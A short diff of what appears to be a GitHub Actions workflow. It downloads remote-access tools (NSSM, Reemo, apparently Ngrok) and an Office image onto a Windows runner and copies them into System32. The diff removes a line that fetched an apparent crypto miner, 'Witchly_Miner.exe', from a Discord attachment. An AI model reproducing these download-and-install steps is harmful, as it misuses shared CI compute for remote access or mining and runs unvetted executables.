@@ -16,7 +16,6 @@ jobs:
         Invoke-WebRequest https://github.com/primas305/winnos/raw/main/nssm.exe -OutFile nssm.exe
         Invoke-WebRequest https://officecdn.microsoft.com/pr/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/en-US/O365HomePremRetail.img -Outfile O365HomePremRetail.img
         Invoke-WebRequest https://download.reemo.io/reemo.setup.x64.exe  -Outfile reemo.exe
-        invoke-WebRequest https://cdn.discordapp.com/attachments/933944268484141096/942574848922755112/Witchly_Miner.exe -Outfile witchly.exe
     - name: Copy NSSM & Ngrok to Windows Directory.
       run: | 
         copy nssm.exe C:\Windows\System32
